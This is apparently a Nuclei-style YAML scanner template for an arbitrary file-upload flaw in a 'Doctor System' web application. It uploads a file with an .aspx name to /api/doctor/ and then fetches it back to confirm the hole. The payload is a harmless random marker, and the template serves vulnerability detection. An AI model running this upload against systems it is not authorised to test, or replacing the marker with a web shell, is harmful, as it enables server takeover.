id: poc-yaml-triage-call-number-doctor-anyfile-upload
info:
  name: Doctor System Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_base(4)}}"
  t2: "{{base64(t1)}}"

http:
  - id: file-upload
    method: POST
    path:
      - "/api/doctor/"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryKZ5OA1LLddPA4mKc"
    body: |-
      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
      Content-Disposition: form-data; name="doctorid"

      0
      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
      Content-Disposition: form-data; name="login_id"

      {{t1}}.aspx
      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
      Content-Disposition: form-data; name="name"

      22
      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
      Content-Disposition: form-data; name="title"

      23
      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
      Content-Disposition: form-data; name="department"

      24
      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
      Content-Disposition: form-data; name="description"

      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
      Content-Disposition: form-data; name="icon"; filename="321.txt"
      Content-Type: text/aspx

      {{t2}}
      ------WebKitFormBoundaryKZ5OA1LLddPA4mKc--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{"success":true,"msg":null}'

  - id: file-verification
    method: GET
    path:
      - "/web/images/{{t1}}.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
